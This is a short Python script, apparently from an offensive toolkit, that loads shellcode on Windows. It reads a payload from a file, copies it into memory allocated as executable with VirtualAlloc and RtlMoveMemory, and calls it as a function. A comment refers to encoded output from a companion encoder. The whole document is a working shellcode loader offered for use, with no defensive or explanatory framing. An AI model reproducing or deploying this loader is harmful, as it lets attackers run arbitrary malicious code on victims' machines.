import ctypes
import sys

def run_shellcode(shellcode: bytes):
    size = len(shellcode)
    # Allocate memory with execute permission.
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        None,
        ctypes.c_int(size),
        0x3000,  # MEM_COMMIT | MEM_RESERVE
        0x40     # PAGE_EXECUTE_READWRITE
    )
    if not ptr:
        sys.exit("VirtualAlloc failed")
    # Copy the shellcode into the allocated memory.
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         shellcode,
                                         ctypes.c_int(size))
    # Cast the memory to a function and call it.
    func_type = ctypes.CFUNCTYPE(None)
    func = func_type(ptr)
    func()

if __name__ == "__main__":
    # Read the encoded shellcode from a file (e.g., produced by the encoder with --stub)
    with open(sys.argv[1], "rb") as f:
        sc = f.read()
    run_shellcode(sc)
